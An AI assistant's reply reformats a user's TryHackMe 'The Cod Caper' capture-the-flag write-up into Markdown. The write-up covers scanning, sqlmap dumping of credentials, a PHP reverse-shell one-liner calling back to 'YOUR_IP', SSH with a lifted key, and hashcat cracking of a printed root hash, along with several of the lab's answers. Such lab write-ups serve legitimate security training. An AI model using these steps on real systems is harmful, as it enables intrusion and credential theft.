Got it 👍 — you want the **entire thing directly in `.md` format** so you can copy-paste into a `README.md`.  
Here’s the full conversion of your original write-up into proper markdown:  

---

```markdown
# 🐟 TryHackMe - The Cod Caper

My solution for the room: [The Cod Caper](https://tryhackme.com/room/thecodcaper)

![thm1](https://user-images.githubusercontent.com/67475596/103531558-e71f3400-4e89-11eb-96a5-9e29f9b15173.png)  
![thm2](https://user-images.githubusercontent.com/67475596/103531561-e7b7ca80-4e89-11eb-9f11-b9698347ab12.png)  

---

## 🔎 Host Enumeration

The first step is to see what ports and services are running on the target machine.  

**Recommended Tool:** `nmap`  
**Useful Flags:** `-p -sC -A`  

To answer these questions, scan the machine with nmap and analyze the results.

```bash
nmap -A <IP> -vv
```

![nmap](https://user-images.githubusercontent.com/67475596/103458587-e65f9400-4d09-11eb-85da-2f2e1c717200.png)

We can see two ports open:  
- 22 → ssh  
- 80 → http  

**Questions:**  
1. How many ports are open on the target machine? → `2`  
2. What is the http-title of the web server? → `Apache2 Ubuntu Default Page: It works`  
3. What version is the ssh service? → `OpenSSH 7.2p2 Ubuntu 4ubuntu2.8`  
4. What is the version of the web server? → `Apache/2.4.18`  

---

## 🌐 Web Enumeration

Since only SSH and Apache are running, let’s check the web server for possible vulnerabilities.  

**Recommended Tool:** `gobuster`  
**Useful Flags:** `-x --url --wordlist`  
**Wordlist:** `big.txt`  

If we open the IP in a browser, we see the default Apache2 Ubuntu page.  
Now let’s scan with gobuster to enumerate directories and files.

```bash
gobuster dir -u http://IP/ -w big.txt -x .php,.html,.txt
```

![gobuster](https://user-images.githubusercontent.com/67475596/103477366-9262b700-4dbe-11eb-8479-c080708fcaa9.png)

📌 We found an important file!  

**Question:**  
- What is the name of the important file on the server? → `administrator.php`  

---

## 💉 Web Exploitation

The admin page gives a login form. First check for low-hanging fruit like SQL Injection.  

**Recommended Tool:** `sqlmap`  
**Useful Flags:** `-u --forms --dump -a`  

On `IP/administrator.php`, we have an admin login form.  

![login](https://user-images.githubusercontent.com/67475596/103477577-8c6dd580-4dc0-11eb-9179-4bf229f46f7e.png)

First, intercept the HTTP request with **BurpSuite**, save it as `request.txt`, then run sqlmap:  

```bash
sqlmap -r request.txt -D users --tables
sqlmap -r request.txt -D users -T users --dump
```

![sqlmap1](https://user-images.githubusercontent.com/67475596/103477764-0c486f80-4dc2-11eb-8381-22f1d908bc69.png)  
![sqlmap2](https://user-images.githubusercontent.com/67475596/103477797-592c4600-4dc2-11eb-98a8-ae36a56d3c15.png)  
![sqlmap3](https://user-images.githubusercontent.com/67475596/103477822-9a245a80-4dc2-11eb-9629-02cb1b129a2b.png)

We found usernames and passwords!  

![user pass sqlmap](https://user-images.githubusercontent.com/67475596/103477845-d9eb4200-4dc2-11eb-906a-61f035ae8e09.jpg)

**Questions:**  
1. What is the admin username?  
2. What is the admin password?  
3. How many forms of SQLi is the form vulnerable to? → `3`  

![sql1](https://user-images.githubusercontent.com/67475596/103491639-d9d05e00-4e25-11eb-88be-fbc4db8cef33.png)  
![sql2](https://user-images.githubusercontent.com/67475596/103491642-dc32b800-4e25-11eb-88b2-7026454113c4.png)  
![sql3](https://user-images.githubusercontent.com/67475596/103491644-dccb4e80-4e25-11eb-8d12-2ab8077ca7ef.png)  

---

## ⚡ Command Execution

With the credentials from sqlmap, we log in.  

We get another form:  

![run_command](https://user-images.githubusercontent.com/67475596/103491811-f8832480-4e26-11eb-99ef-e6f307ee9b77.png)

Let’s try to get a reverse shell with **netcat**. First, prepare a PHP shell:  

```bash
php -r '$sock=fsockopen("YOUR_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Run netcat on attacker machine:  

```bash
nc -lvnp 4444
```

![run netcat](https://user-images.githubusercontent.com/67475596/103491944-db028a80-4e27-11eb-9bd4-928918dcc68d.png)

If successful, we get access to the target:  

![netcat](https://user-images.githubusercontent.com/67475596/103492037-93c8c980-4e28-11eb-868b-df6845cd33a9.png)

**Questions:**  
1. How many files are in the current directory? → `3`  
2. Do I still have an account? → `yes`  
3. What is my ssh password? → Path: `/var/hidden/pass`  

![pass ssh](https://user-images.githubusercontent.com/67475596/103492201-85c77880-4e29-11eb-9f81-0afbb665caa3.jpg)  

---

## 🔑 LinEnum

**Question:** What is the interesting path of the interesting SUID file?  

First connect via SSH using the key at `/home/pingu/.ssh/id_rsa`.  

```bash
ssh -i ssh_key.txt pingu@IP
```

![ssh](https://user-images.githubusercontent.com/67475596/103492363-afcd6a80-4e2a-11eb-8319-386995457d0d.png)

To list all SUID binaries:  

```bash
find / -perm -u=s -type f 2>/dev/null
```

![suidfiles](https://user-images.githubusercontent.com/67475596/103530465-c7870c00-4e87-11eb-9dba-cd558909834c.png)

---

## 🛠 pwndbg

No answer needed.

---

## 🛠 Binary Exploitation (Manually)

No answer needed.

---

## 🛠 Binary Exploitation (Pwntools)

No answer needed.

---

## 🔓 Finishing the Job

Now that we have the password hashes, we can crack them to get the root password.  

Root hash:  

```
$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.
```

Usage with hashcat (mode 1800):  

```bash
hashcat -m 1800 hash.txt wordlist.txt
```

---

## ✅ Conclusion

We exploited **The Cod Caper** using:  
- Enumeration (`nmap`, `gobuster`)  
- SQL Injection (`sqlmap`)  
- Command Execution (reverse shell)  
- Privilege Escalation (SUID, ssh key, password cracking)  

🚩 Room Completed 🎉
```

---

This is **ready to paste directly into a `README.md`** file.  

Do you want me to also add a **Table of Contents** at the top (with links to each section) so it’s easier to navigate on GitHub?
